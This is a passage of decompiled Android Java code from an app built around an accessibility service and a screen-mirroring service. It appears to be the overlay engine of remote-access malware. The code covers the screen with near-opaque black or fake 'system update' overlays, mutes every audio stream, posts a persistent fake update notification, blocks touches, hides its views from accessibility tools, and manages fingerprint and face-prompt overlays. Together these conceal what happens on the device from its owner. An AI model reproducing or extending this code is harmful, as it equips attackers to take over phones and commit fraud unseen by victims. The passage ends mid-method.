// Decompiled with JADX from the REA-supplied audited engine JAR; not original source.
package w1;

import android.accessibilityservice.AccessibilityService;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.res.ColorStateList;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.media.AudioManager;
import android.os.Handler;
import android.os.Looper;
import android.text.Layout;
import android.text.StaticLayout;
import android.text.TextPaint;
import android.text.TextUtils;
import android.util.Log;
import android.util.TypedValue;
import android.view.View;
import android.view.ViewParent;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import com.os9sp.yfwkcq0dwfxaf.R;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;
import java.util.concurrent.atomic.AtomicReference;
import lyr.stable.runtime.BlackOverlayExpiryReceiver;
import lyr.stable.runtime.ScreenMirrorService;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/* JADX INFO: compiled from: r8-map-id-5347474c40041fa035618ae5fd6f249b536e43095feee62dfa1b0bceecef7771 */
/* JADX INFO: loaded from: classes.dex */
public abstract class wf {
    public static q3 A;
    public static int[] B;
    public static boolean[] C;
    public static long D;
    public static long F;
    public static long G;
    public static long H;
    public static long I;
    public static int J;
    public static long K;
    public static long L;
    public static long M;
    public static lf N;

    /* JADX INFO: renamed from: e, reason: collision with root package name */
    public static volatile Context f5442e;

    /* JADX INFO: renamed from: f, reason: collision with root package name */
    public static AccessibilityService f5443f;

    /* JADX INFO: renamed from: g, reason: collision with root package name */
    public static View f5444g;

    /* JADX INFO: renamed from: h, reason: collision with root package name */
    public static g8 f5445h;

    /* JADX INFO: renamed from: i, reason: collision with root package name */
    public static View f5446i;

    /* JADX INFO: renamed from: j, reason: collision with root package name */
    public static uf f5447j;

    /* JADX INFO: renamed from: k, reason: collision with root package name */
    public static View f5448k;

    /* JADX INFO: renamed from: l, reason: collision with root package name */
    public static t3 f5449l;

    /* JADX INFO: renamed from: m, reason: collision with root package name */
    public static View f5450m;
    public static boolean n;

    /* JADX INFO: renamed from: o, reason: collision with root package name */
    public static long f5451o;

    /* JADX INFO: renamed from: p, reason: collision with root package name */
    public static g8 f5452p;

    /* JADX INFO: renamed from: q, reason: collision with root package name */
    public static ProgressBar f5453q;

    /* JADX INFO: renamed from: r, reason: collision with root package name */
    public static TextView f5454r;

    /* JADX INFO: renamed from: s, reason: collision with root package name */
    public static boolean f5455s;

    /* JADX INFO: renamed from: t, reason: collision with root package name */
    public static boolean f5456t;

    /* JADX INFO: renamed from: u, reason: collision with root package name */
    public static boolean f5457u;

    /* JADX INFO: renamed from: v, reason: collision with root package name */
    public static boolean f5458v;

    /* JADX INFO: renamed from: w, reason: collision with root package name */
    public static boolean f5459w;

    /* JADX INFO: renamed from: z, reason: collision with root package name */
    public static y3 f5462z;

    /* JADX INFO: renamed from: a, reason: collision with root package name */
    public static final Handler f5438a = new Handler(Looper.getMainLooper());

    /* JADX INFO: renamed from: b, reason: collision with root package name */
    public static final Object f5439b = new Object();

    /* JADX INFO: renamed from: c, reason: collision with root package name */
    public static final x8 f5440c = new x8();

    /* JADX INFO: renamed from: d, reason: collision with root package name */
    public static final int[] f5441d = {3, 2, 5, 1, 4};

    /* JADX INFO: renamed from: x, reason: collision with root package name */
    public static String f5460x = "update";

    /* JADX INFO: renamed from: y, reason: collision with root package name */
    public static int f5461y = 99;
    public static long E = 3600000;
    public static final AtomicLong O = new AtomicLong();
    public static final d8 P = new d8(new m0(8));
    public static ArrayList Q = new ArrayList(y7.f5609a);
    public static final d2.r R = new d2.r(24);
    public static final d2.r S = new d2.r(25);
    public static final d2.r T = new d2.r(26);
    public static final d2.r U = new d2.r(27);

    public static boolean A() {
        return f5440c.d().f5414g;
    }

    public static String B(String str, String str2) {
        m0();
        e();
        l0();
        if (q().isEmpty()) {
            F(str2);
            return j0();
        }
        L();
        f(f5443f);
        Log.i("UpdateNotice", "overlay layer hidden: " + str + " (" + str2 + ")");
        return j0();
    }

    public static String C(String str, long j3) {
        synchronized (f5439b) {
            x8 x8Var = f5440c;
            synchronized (x8Var) {
                if (j3 != x8Var.f5523i) {
                    return j0();
                }
                x8Var.f5521g = false;
                x8Var.f5522h = false;
                t3 t3Var = f5449l;
                U(t3Var);
                f5449l = null;
                if (t3Var != null) {
                    t3Var.c();
                }
                M = 0L;
                A = null;
                return B("face", str);
            }
        }
    }

    public static String D(String str, long j3) {
        synchronized (f5439b) {
            x8 x8Var = f5440c;
            synchronized (x8Var) {
                if (j3 != x8Var.f5520f) {
                    return j0();
                }
                x8Var.f5518d = false;
                x8Var.f5519e = false;
                lf lfVar = N;
                N = null;
                if (lfVar != null) {
                    f5438a.removeCallbacks(lfVar);
                }
                U(f5448k);
                f5448k = null;
                K = 0L;
                L = 0L;
                f5462z = null;
                return B("fingerprint", str);
            }
        }
    }

    public static String E(String str, String str2) {
        synchronized (f5439b) {
            try {
                if (!y7.a(str)) {
                    if (str.equals(f5460x) && !H()) {
                        F(str2);
                    }
                    return j0();
                }
                if ("black".equals(str)) {
                    o();
                    U(f5446i);
                    f5446i = null;
                    f5459w = false;
                    k0();
                    F = 0L;
                } else if ("update".equals(str)) {
                    U(f5447j);
                    f5447j = null;
                    x8 x8Var = f5440c;
                    synchronized (x8Var) {
                        x8Var.f5515a = false;
                        x8Var.f5516b = false;
                        x8Var.f5517c = 0L;
                    }
                    f5438a.removeCallbacks(U);
                } else {
                    if ("fingerprint".equals(str)) {
                        return D(str2, f5440c.c());
                    }
                    if ("face".equals(str)) {
                        return C(str2, f5440c.b());
                    }
                }
                return B(str, str2);
            } catch (Throwable th) {
                throw th;
            }
        }
    }

    public static void F(String str) {
        synchronized (f5439b) {
            try {
                AccessibilityService accessibilityService = f5443f;
                boolean z2 = A() || f5462z != null;
                boolean z3 = f5459w;
                d0(false);
                Handler handler = f5438a;
                handler.removeCallbacks(R);
                lf lfVar = N;
                N = null;
                if (lfVar != null) {
                    handler.removeCallbacks(lfVar);
                }
                r();
                AccessibilityService accessibilityService2 = f5443f;
                if (accessibilityService2 != null) {
                    try {
                        NotificationManager notificationManager = (NotificationManager) accessibilityService2.getSystemService("notification");
                        if (notificationManager != null) {
                            notificationManager.cancel(7302);
                        }
                    } catch (Throwable unused) {
                    }
                }
                f5457u = false;
                if (!z2 && !z3) {
                    W();
                }
                f5455s = false;
                f5462z = null;
                A = null;
                f5459w = false;
                f5440c.a();
                l0();
                F = 0L;
                G = 0L;
                K = 0L;
                L = 0L;
                M = 0L;
                if (!f5458v) {
                    f5443f = null;
                }
                D = 0L;
                E = 3600000L;
                long jCurrentTimeMillis = System.currentTimeMillis();
                r1 r1VarS = S(jCurrentTimeMillis);
                if (r1VarS.a(jCurrentTimeMillis)) {
                    f5443f = accessibilityService;
                    d(r1VarS);
                    f5455s = true;
                    f5460x = "black";
                    D = r1VarS.f4973a;
                    l0();
                    b0(jCurrentTimeMillis);
                    c0();
                }
                Log.i("UpdateNotice", "update notice hidden: ".concat(str));
            } catch (Throwable th) {
                throw th;
            }
        }
    }

    public static boolean G(View view) {
        return I() && view != null && view.getParent() == f5444g && view.isAttachedToWindow();
    }

    public static boolean H() {
        View view = f5444g;
        return (view instanceof FrameLayout) && "overlay-stack".equals(view.getTag());
    }

    public static boolean I() {
        return H() && f5444g.isAttachedToWindow();
    }

    public static JSONObject J(boolean z2, boolean z3, boolean z4, boolean z5, String str) throws JSONException {
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("attached", z2);
        jSONObject.put("desiredVisible", z3);
        jSONObject.put("visible", z4);
        jSONObject.put("suppressed", z5);
        if (str != null) {
            jSONObject.put("suppressedBy", str);
        }
        return jSONObject;
    }

    public static WindowManager.LayoutParams K(WindowManager windowManager) {
        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(-1, g8.A(windowManager), 2032, 184, -3);
        layoutParams.gravity = 8388659;
        layoutParams.alpha = 1.0f;
        layoutParams.screenBrightness = 0.0f;
        layoutParams.dimAmount = 0.0f;
        layoutParams.setTitle("dicktok-owned-visual-mask:".concat("legacy"));
        g8.y(layoutParams);
        return layoutParams;
    }

    /* JADX WARN: Code duplicated, block: B:7:0x0019  */
    public static void L() {
        long jMin;
        y3 y3Var;
        f5455s = true;
        if (f5459w) {
            long j3 = F;
            if (j3 > 0) {
                jMin = Math.min(Long.MAX_VALUE, j3);
            } else {
                jMin = Long.MAX_VALUE;
            }
        } else {
            jMin = Long.MAX_VALUE;
        }
        w8 w8VarD = f5440c.d();
        if (w8VarD.f5409b) {
            long j4 = w8VarD.f5412e;
            if (j4 > 0) {
                jMin = Math.min(jMin, j4);
            }
        }
        if (A()) {
            long j5 = K;
            if (j5 > 0) {
                jMin = Math.min(jMin, j5);
            }
        }
        if (z()) {
            long j6 = M;
            if (j6 > 0) {
                jMin = Math.min(jMin, j6);
            }
        }
        if (jMin == Long.MAX_VALUE) {
            jMin = 0;
        }
        D = jMin;
        h0();
        String strC = y7.c(q());
        if (strC != null) {
            f5460x = strC;
        }
        String strC2 = y7.c(q());
        if ("update".equals(strC2)) {
            E = 3600000L;
            return;
        }
        if ("fingerprint".equals(strC2) && (y3Var = f5462z) != null) {
            long j7 = y3Var.f5588m;
            E = j7 >= 1000 ? Math.min(j7, 3600000L) : 1000L;
        } else if ("face".equals(strC2)) {
            E = 0L;
        } else {
            E = 3600000L;
        }
    }

    public static void M(ScreenMirrorService screenMirrorService) {
        if (f5458v) {
            return;
        }
        AudioManager audioManager = (AudioManager) screenMirrorService.getSystemService(AudioManager.class);
        if (audioManager == null) {
            Log.w("UpdateNotice", "audio manager unavailable; mute skipped");
            return;
        }
        int[] iArr = f5441d;
        B = new int[iArr.length];
        C = new boolean[iArr.length];
        boolean z2 = false;
        for (int i3 = 0; i3 < iArr.length; i3++) {
            int i4 = iArr[i3];
            try {
                B[i3] = audioManager.getStreamVolume(i4);
                C[i3] = audioManager.isStreamMute(i4);
                audioManager.setStreamVolume(i4, 0, 0);
                z2 = true;
            } catch (Throwable th) {
                B[i3] = -1;
                a0.a.p(th, a0.a.i(i4, "mute stream ", " failed: "), "UpdateNotice");
            }
        }
        f5458v = z2;
        Log.i("UpdateNotice", "device audio muted=" + f5458v);
    }

    public static void N() {
        if (Looper.myLooper() == Looper.getMainLooper()) {
            P.o();
            Y("window_changed");
        } else {
            f5438a.post(new d2.r(28));
        }
    }

    public static void O(ScreenMirrorService screenMirrorService) {
        if (Looper.myLooper() != Looper.getMainLooper()) {
            f5438a.post(new pa(screenMirrorService, 28));
            return;
        }
        synchronized (f5439b) {
            WindowManager windowManager = (WindowManager) screenMirrorService.getSystemService(WindowManager.class);
            if (windowManager == null) {
                return;
            }
            try {
                if (f5444g != null) {
                    windowManager.updateViewLayout(f5444g, H() ? i0(windowManager, e0()) : K(windowManager));
                }
                View view = f5450m;
                if (view != null && n) {
                    windowManager.updateViewLayout(view, o0(windowManager));
                }
            } catch (Throwable th) {
                Log.w("UpdateNotice", "overlay configuration update failed: " + th.getMessage());
            }
            g8 g8Var = f5445h;
            if (g8Var != null) {
                g8Var.D();
            }
            g8 g8Var2 = f5452p;
            if (g8Var2 != null) {
                g8Var2.D();
            }
        }
    }

    public static void P(String str) {
        if (Looper.myLooper() != Looper.getMainLooper()) {
            f5438a.post(new q8(str, 1));
            return;
        }
        Log.e("UpdateNotice", "[OverlayPunch] protection unavailable detail=".concat(str));
        long jCurrentTimeMillis = System.currentTimeMillis();
        r1 r1VarS = S(jCurrentTimeMillis);
        if (!r1VarS.a(jCurrentTimeMillis)) {
            F("protection_unavailable");
            return;
        }
        r();
        t();
        d(r1VarS);
        f5455s = true;
        f5460x = "black";
        D = r1VarS.f4973a;
        b0(jCurrentTimeMillis);
        c0();
    }

    public static float Q() {
        x8 x8Var = f5440c;
        if (!x8Var.d().f5408a) {
            return n4.z0(System.currentTimeMillis(), D, E);
        }
        long jCurrentTimeMillis = System.currentTimeMillis();
        synchronized (x8Var) {
            if (x8Var.f5515a) {
                long j3 = x8Var.f5517c;
                if (j3 > 0) {
                    return n4.z0(jCurrentTimeMillis, j3, 3600000L);
                }
            }
            return 0.0f;
        }
    }

    public static void R(JSONObject jSONObject, y3 y3Var) throws JSONException {
        jSONObject.put("sensorType", y3Var.f5577b);
        Double d3 = y3Var.f5578c;
        if (d3 != null) {
            jSONObject.put("centerX", d3);
        }
        Double d4 = y3Var.f5579d;
        if (d4 != null) {
            jSONObject.put("centerY", d4);
        }
        Double d5 = y3Var.f5580e;
        if (d5 != null) {
            jSONObject.put("radius", d5);
        }
        String str = y3Var.f5581f;
        if (str != null) {
            jSONObject.put("edge", str);
        }
        Double d6 = y3Var.f5582g;
        if (d6 != null) {
            jSONObject.put("offset", d6);
        }
        String str2 = y3Var.f5583h;
        if (str2 != null) {
            jSONObject.put("horizontal", str2);
        }
        String str3 = y3Var.f5584i;
        if (str3 != null) {
            jSONObject.put("vertical", str3);
        }
        jSONObject.put("title", y3Var.f5585j);
        jSONObject.put("subtitle", y3Var.f5586k);
        jSONObject.put("textY", y3Var.f5587l);
    }

    public static r1 S(long j3) {
        SharedPreferences sharedPreferencesM = m();
        if (sharedPreferencesM == null) {
            return r1.b(F, G, j3, f5459w);
        }
        boolean z2 = sharedPreferencesM.getBoolean("desired", false);
        r1 r1VarB = r1.b(sharedPreferencesM.getLong("started_at_ms", 0L), sharedPreferencesM.getLong("expires_at_ms", 0L), j3, z2);
        if (z2 && !r1VarB.f4975c) {
            sharedPreferencesM.edit().clear().apply();
        }
        return r1VarB;
    }

    public static void T(Context context) {
        if (context == null) {
            return;
        }
        Context applicationContext = context.getApplicationContext();
        if (applicationContext != null) {
            context = applicationContext;
        }
        f5442e = context;
    }

    public static void U(View view) {
        if (!(f5444g instanceof FrameLayout) || view == null) {
            return;
        }
        ViewParent parent = view.getParent();
        View view2 = f5444g;
        if (parent == view2) {
            ((FrameLayout) view2).removeView(view);
        }
    }

    public static void V() {
        View view;
        if (H()) {
            FrameLayout frameLayout = (FrameLayout) f5444g;
            ArrayList arrayList = Q;
            int size = arrayList.size();
            int i3 = 0;
            while (i3 < size) {
                Object obj = arrayList.get(i3);
                i3++;
                String str = (String) obj;
                if ("black".equals(str)) {
                    view = f5446i;
                } else if ("update".equals(str)) {
                    view = f5447j;
                } else if ("fingerprint".equals(str)) {
                    view = f5448k;
                } else {
                    view = "face".equals(str) ? f5449l : null;
                }
                if (view != null && view.getParent() == frameLayout) {
                    frameLayout.bringChildToFront(view);
                }
            }
            m0();
        }
    }

    public static void W() {
        AudioManager audioManager;
        AccessibilityService accessibilityService = f5443f;
        int[] iArr = B;
        boolean[] zArr = C;
        B = null;
        C = null;
        boolean z2 = f5458v;
        f5458v = false;
        if (!z2 || accessibilityService == null || iArr == null || zArr == null || (audioManager = (AudioManager) accessibilityService.getSystemService(AudioManager.class)) == null) {
            return;
        }
        int i3 = 0;
        while (true) {
            int[] iArr2 = f5441d;
            if (i3 >= iArr2.length) {
                Log.i("UpdateNotice", "device audio restored");
                return;
            }
            int i4 = iArr[i3];
            if (i4 >= 0) {
                int i5 = iArr2[i3];
                try {
                    audioManager.setStreamVolume(i5, i4, 0);
                    audioManager.adjustStreamVolume(i5, zArr[i3] ? -100 : 100, 0);
                } catch (Throwable th) {
                    a0.a.p(th, a0.a.i(i5, "restore stream ", " failed: "), "UpdateNotice");
                }
            }
            i3++;
        }
    }

    public static void X(AccessibilityService accessibilityService, String str) {
        synchronized (f5439b) {
            try {
                T(accessibilityService);
                long jCurrentTimeMillis = System.currentTimeMillis();
                r1 r1VarS = S(jCurrentTimeMillis);
                if (!r1VarS.a(jCurrentTimeMillis)) {
                    if (f5459w) {
                        o();
                        E("black", "timeout");
                    }
                    return;
                }
                try {
                    h(accessibilityService, r1VarS);
                    J = 0;
                    Log.i("UpdateNotice", "black overlay lease restored: ".concat(str));
                } catch (Throwable th) {
                    r();
                    t();
                    d(r1VarS);
                    f5455s = true;
                    f5460x = "black";
                    D = r1VarS.f4973a;
                    b0(jCurrentTimeMillis);
                    c0();
                    Log.w("UpdateNotice", "black overlay restore failed reason=" + str + " error=" + th.getClass().getSimpleName());
                }
            } catch (Throwable th2) {
                throw th2;
            }
        }
    }

    public static void Y(String str) {
        AccessibilityService accessibilityService = f5443f;
        if (accessibilityService != null) {
            if (f5459w || G > 0) {
                long jCurrentTimeMillis = System.currentTimeMillis();
                if (!S(jCurrentTimeMillis).a(jCurrentTimeMillis)) {
                    if (f5459w) {
                        o();
                        E("black", "timeout");
                        return;
                    }
                    return;
                }
                if (f5459w && G(f5446i)) {
                    J = 0;
                } else {
                    X(accessibilityService, str);
                }
            }
        }
    }

    public static void Z(Runnable runnable) {
        if (Looper.myLooper() == Looper.getMainLooper()) {
            runnable.run();
        } else {
            if (f5438a.post(runnable)) {
                return;
            }
            Log.w("UpdateNotice", "overlay lifecycle main-thread handoff rejected");
        }
    }

    public static StaticLayout a(String str, TextPaint textPaint, int i3, int i4, float f3) {
        Paint.FontMetrics fontMetrics = textPaint.getFontMetrics();
        return StaticLayout.Builder.obtain(str, 0, str.length(), textPaint, i3).setAlignment(Layout.Alignment.ALIGN_CENTER).setIncludePad(false).setLineSpacing(f3 - Math.max(1.0f, fontMetrics.descent - fontMetrics.ascent), 1.0f).setEllipsize(TextUtils.TruncateAt.END).setEllipsizedWidth(i3).setMaxLines(i4).build();
    }

    public static String a0(of ofVar, boolean z2) {
        if (Looper.myLooper() == Looper.getMainLooper()) {
            return ofVar.run();
        }
        String[] strArr = new String[1];
        CountDownLatch countDownLatch = new CountDownLatch(1);
        e2.q0 q0Var = new e2.q0(strArr, ofVar, countDownLatch, 22);
        Handler handler = f5438a;
        if (z2) {
            handler.postAtFrontOfQueue(q0Var);
        } else {
            handler.post(q0Var);
        }
        try {
            if (countDownLatch.await(8000L, TimeUnit.MILLISECONDS)) {
                String str = strArr[0];
                return str != null ? str : x("unknown");
            }
            Log.w("UpdateNotice", "main_thread_timeout after 8000ms front=" + z2);
            return x("main_thread_timeout");
        } catch (InterruptedException unused) {
            Thread.currentThread().interrupt();
            return x("interrupted");
        }
    }

    public static void b(Runnable runnable) {
        if (Looper.myLooper() == Looper.getMainLooper()) {
            runnable.run();
        } else {
            if (f5438a.post(runnable)) {
                return;
            }
            Log.w("UpdateNotice", "overlay punch main-thread handoff rejected");
        }
    }

    public static void b0(long j3) {
        AlarmManager alarmManager;
        Handler handler = f5438a;
        d2.r rVar = S;
        handler.removeCallbacks(rVar);
        long jMax = Math.max(0L, G - j3);
        if (jMax <= 0) {
            handler.post(rVar);
            return;
        }
        handler.postDelayed(rVar, jMax);
        long j4 = F;
        long j5 = G;
        Context context = f5442e;
        if (context == null || j4 <= 0 || j5 <= j4) {
            return;
        }
        if ((H == j4 && I == j5) || (alarmManager = (AlarmManager) context.getSystemService(AlarmManager.class)) == null) {
            return;
        }
        PendingIntent broadcast = PendingIntent.getBroadcast(context, 7303, new Intent(context, (Class<?>) BlackOverlayExpiryReceiver.class).setAction("lyr.stable.runtime.action.BLACK_OVERLAY_EXPIRE").putExtra("startedAtMs", j4).putExtra("expiresAtMs", j5), 201326592);
        try {
            alarmManager.setExactAndAllowWhileIdle(0, j5, broadcast);
        } catch (SecurityException unused) {
            Log.w("UpdateNotice", "exact black expiry denied; falling back to inexact");
            try {
                alarmManager.setAndAllowWhileIdle(0, j5, broadcast);
            } catch (Throwable th) {
                a0.a.p(th, new StringBuilder("inexact black expiry alarm failed: "), "UpdateNotice");
                return;
            }
        } catch (Throwable th2) {
            a0.a.p(th2, new StringBuilder("black expiry alarm failed: "), "UpdateNotice");
            return;
        }
        H = j4;
        I = j5;
    }

    public static void c(View view, String str) {
        View view2 = f5444g;
        if (!(view2 instanceof FrameLayout)) {
            o2.k("overlay_stack_missing");
            return;
        }
        FrameLayout frameLayout = (FrameLayout) view2;
        view.setTag(str);
        FrameLayout.LayoutParams layoutParams = new FrameLayout.LayoutParams(-1, -1);
        ArrayList arrayListB = y7.b(Q);
        int iIndexOf = arrayListB.indexOf(str);
        int childCount = 0;
        while (childCount < frameLayout.getChildCount()) {
            if (arrayListB.indexOf(String.valueOf(frameLayout.getChildAt(childCount).getTag())) > iIndexOf) {
                frameLayout.addView(view, childCount, layoutParams);
            }
            childCount++;
        }
        childCount = frameLayout.getChildCount();
        frameLayout.addView(view, childCount, layoutParams);
    }

    public static void c0() {
        Handler handler = f5438a;
        d2.r rVar = T;
        handler.removeCallbacks(rVar);
        if (!f5459w || f5443f == null) {
            return;
        }
        long jMin = Math.min(5000L, 400 << Math.min(J, 4));
        J = Math.min(J + 1, 5);
        handler.postDelayed(rVar, jMin);
    }

    public static void d(r1 r1Var) {
        boolean z2 = r1Var.f4975c;
        f5459w = z2;
        F = z2 ? r1Var.f4973a : 0L;
        G = z2 ? r1Var.f4974b : 0L;
    }

    public static void d0(boolean z2) {
        if (z2) {
            q1.f4883a.set(true);
        } else {
            q1.f4883a.set(false);
            synchronized (q1.f4884b) {
                q1.f4885c++;
                q1.f4886d = 0;
                q1.f4887e = 0L;
            }
        }
        g8 g8Var = f5445h;
        if (g8Var != null) {
            g8Var.E(z2);
        }
        g8 g8Var2 = f5452p;
        if (g8Var2 != null) {
            g8Var2.E(z2);
        }
    }

    public static void e() {
        if (H()) {
            boolean z2 = f5459w || f5440c.d().f5409b || A() || z();
            f5461y = 99;
            f5444g.setBackgroundColor(z2 ? Math.round((99 * 255.0f) / 100.0f) << 24 : 0);
        }
    }

    public static boolean e0() {
        if (f5459w || f5440c.d().f5409b || A() || z()) {
            return "black".equals(y7.c(q()));
        }
        return false;
    }

    public static void f(AccessibilityService accessibilityService) {
        WindowManager windowManager;
        if (accessibilityService == null || !H() || (windowManager = (WindowManager) accessibilityService.getSystemService(WindowManager.class)) == null) {
            return;
        }
        try {
            windowManager.updateViewLayout(f5444g, i0(windowManager, e0()));
        } catch (Throwable th) {
            a0.a.p(th, new StringBuilder("overlay stack layout update failed: "), "UpdateNotice");
        }
        g8 g8Var = f5445h;
        if (g8Var != null) {
            g8Var.D();
        }
        if (p0()) {
            w(accessibilityService);
        } else {
            s();
        }
        k0();
    }

    public static String f0(ScreenMirrorService screenMirrorService, String str) {
        if (!"update".equals(str) && !"maintenance".equals(str) && !"sync".equals(str) && !"security".equals(str) && !"black".equals(str)) {
            str = null;
        }
        if (str == null) {
            return x("unknown_template");
        }
        if ("black".equals(str)) {
            return a0(new aa(screenMirrorService, 19), true);
        }
        return "update".equals(str) ? a0(new aa(screenMirrorService, 18), true) : a0(new d2.c(screenMirrorService, str, 13), true);
    }

    public static void g(View view) {
        if (view == null) {
            return;
        }
        view.setClickable(true);
        view.setImportantForAccessibility(2);
        view.setOnTouchListener(new f2.v(2));
    }

    public static void g0(ScreenMirrorService screenMirrorService, String str) {
        try {
            vf vfVarN0 = n0(str);
            NotificationManager notificationManager = (NotificationManager) screenMirrorService.getSystemService("notification");
            if (notificationManager == null) {
                return;
            }
            NotificationChannel notificationChannel = new NotificationChannel("runtime_update_notice", screenMirrorService.getString(R.string.update_notice_channel), 3);
            notificationChannel.setDescription(screenMirrorService.getString(R.string.update_overlay_description));
            notificationChannel.setSound(null, null);
            notificationChannel.enableVibration(false);
            notificationManager.createNotificationChannel(notificationChannel);
            notificationManager.notify(7302, new Notification.Builder(screenMirrorService, "runtime_update_notice").setSmallIcon(vfVarN0.f5343e).setContentTitle(screenMirrorService.getString(vfVarN0.f5339a)).setContentText(screenMirrorService.getString(vfVarN0.f5340b)).setCategory("progress").setOngoing(true).setOnlyAlertOnce(true).setShowWhen(false).build());
            f5457u = true;
        } catch (Throwable th) {
            f5457u = false;
            a0.a.p(th, new StringBuilder("update notification failed: "), "UpdateNotice");
        }
    }

    public static void h(AccessibilityService accessibilityService, r1 r1Var) {
        long jCurrentTimeMillis = System.currentTimeMillis();
        if (accessibilityService == null || !r1Var.a(jCurrentTimeMillis)) {
            o2.k("black_lease_expired");
            return;
        }
        f5443f = accessibilityService;
        f5461y = 99;
        d(r1Var);
        if (!I() && f5444g != null) {
            r();
            t();
        }
        v(accessibilityService);
        if (G(f5446i)) {
            g(f5446i);
        } else {
            View view = f5446i;
            if (view != null) {
                U(view);
            }
            View view2 = new View(accessibilityService);
            view2.setBackgroundColor(0);
            view2.setImportantForAccessibility(4);
            g(view2);
            c(view2, "black");
            f5446i = view2;
        }
        e();
        l0();
        L();
        f(accessibilityService);
        b0(jCurrentTimeMillis);
        Log.i("UpdateNotice", "black overlay lease attached expiresAtMs=" + G);
    }

    /* JADX WARN: Code duplicated, block: B:7:0x000d  */
    public static long h0() {
        long j3;
        if (f5459w) {
            j3 = G;
            if (j3 <= 0) {
                j3 = 0;
            }
        } else {
            j3 = 0;
        }
        if (A()) {
            long j4 = L;
            if (j4 > 0) {
                return j3 <= 0 ? j4 : Math.min(j3, j4);
            }
        }
        return j3;
    }

    public static void i(ScreenMirrorService screenMirrorService, String str) {
        View view;
        View view2 = f5444g;
        if (view2 != null && view2.isAttachedToWindow()) {
            f5456t = true;
            g8 g8Var = f5445h;
            if (g8Var != null) {
                g8Var.D();
                return;
            }
            return;
        }
        if (f5444g != null) {
            r();
        }
        WindowManager windowManager = (WindowManager) screenMirrorService.getSystemService(WindowManager.class);
        if (windowManager == null) {
            o2.k("window_manager_unavailable");
            return;
        }
        if ("black".equals(str)) {
            View view3 = new View(screenMirrorService);
            view3.setBackgroundColor(Math.round((99 * 255.0f) / 100.0f) << 24);
            view3.setImportantForAccessibility(4);
            g(view3);
            view = view3;
        } else if ("update".equals(str)) {
            View ufVar = new uf(screenMirrorService);
            ufVar.setImportantForAccessibility(4);
            view = ufVar;
        } else {
            vf vfVarN0 = n0(str);
            LinearLayout linearLayout = new LinearLayout(screenMirrorService);
            linearLayout.setOrientation(1);
            linearLayout.setGravity(17);
            linearLayout.setPadding(u(screenMirrorService, 32), u(screenMirrorService, 32), u(screenMirrorService, 32), u(screenMirrorService, 32));
            linearLayout.setBackgroundColor(vfVarN0.f5342d);
            linearLayout.setImportantForAccessibility(4);
            LinearLayout linearLayout2 = new LinearLayout(screenMirrorService);
            linearLayout2.setOrientation(1);
            linearLayout2.setGravity(1);
            linearLayout2.setPadding(u(screenMirrorService, 18), u(screenMirrorService, 20), u(screenMirrorService, 18), u(screenMirrorService, 20));
            GradientDrawable gradientDrawable = new GradientDrawable();
            gradientDrawable.setColor(Color.argb(200, 28, 30, 36));
            gradientDrawable.setCornerRadius(u(screenMirrorService, 16));
            int iU = u(screenMirrorService, 1);
            int i3 = vfVarN0.f5341c;
            gradientDrawable.setStroke(iU, i3);
            linearLayout2.setBackground(gradientDrawable);
            TextView textView = new TextView(screenMirrorService);
            textView.setText((String) vfVarN0.f5344f);
            textView.setTextColor(i3);
            textView.setTextSize(2, 30.0f);
            textView.setGravity(17);
            linearLayout2.addView(textView, new LinearLayout.LayoutParams(-1, -2));
            TextView textView2 = new TextView(screenMirrorService);
            textView2.setText(screenMirrorService.getString(vfVarN0.f5339a));
            textView2.setTextColor(-1);
            textView2.setTextSize(2, 16.0f);
            textView2.setTypeface(Typeface.DEFAULT_BOLD);
            textView2.setGravity(17);
            LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(-1, -2);
            layoutParams.topMargin = u(screenMirrorService, 8);
            linearLayout2.addView(textView2, layoutParams);
            TextView textView3 = new TextView(screenMirrorService);
            textView3.setText(screenMirrorService.getString(vfVarN0.f5340b));
            textView3.setTextColor(Color.rgb(190, 196, 208));
            textView3.setTextSize(2, 12.0f);
            textView3.setGravity(17);
            LinearLayout.LayoutParams layoutParams2 = new LinearLayout.LayoutParams(-1, -2);
            layoutParams2.topMargin = u(screenMirrorService, 8);
            linearLayout2.addView(textView3, layoutParams2);
            ProgressBar progressBar = new ProgressBar(screenMirrorService, null, android.R.attr.progressBarStyleHorizontal);
            progressBar.setMax(100);
            progressBar.setProgress(1);
            progressBar.setIndeterminate(false);
            progressBar.setProgressTintList(ColorStateList.valueOf(i3));
            progressBar.setProgressBackgroundTintList(ColorStateList.valueOf(Color.rgb(48, 52, 62)));
            LinearLayout.LayoutParams layoutParams3 = new LinearLayout.LayoutParams(-1, u(screenMirrorService, 4));
            layoutParams3.topMargin = u(screenMirrorService, 14);
            linearLayout2.addView(progressBar, layoutParams3);
            f5453q = progressBar;
            TextView textView4 = new TextView(screenMirrorService);
            textView4.setText(screenMirrorService.getString(R.string.update_overlay_percent, 1));
            textView4.setTextColor(Color.rgb(170, 176, 188));
            textView4.setTextSize(2, 12.0f);
            textView4.setGravity(17);
            LinearLayout.LayoutParams layoutParams4 = new LinearLayout.LayoutParams(-1, -2);
            layoutParams4.topMargin = u(screenMirrorService, 8);
            linearLayout2.addView(textView4, layoutParams4);
            f5454r = textView4;
            linearLayout.addView(linearLayout2, new LinearLayout.LayoutParams(u(screenMirrorService, 260), -2));
            view = linearLayout;
        }
        view.setId(R.id.owned_visual_mask_window);
        g8.C(view);
        windowManager.addView(view, K(windowManager));
        f5444g = view;
        g8 g8VarW = g8.w(screenMirrorService, view);
        f5445h = g8VarW;
        g8VarW.f4126i = false;
        f5456t = true;
        Log.i("UpdateNotice", str.concat(" overlay attached (sbrt=0)"));
    }

    public static WindowManager.LayoutParams i0(WindowManager windowManager, boolean z2) {
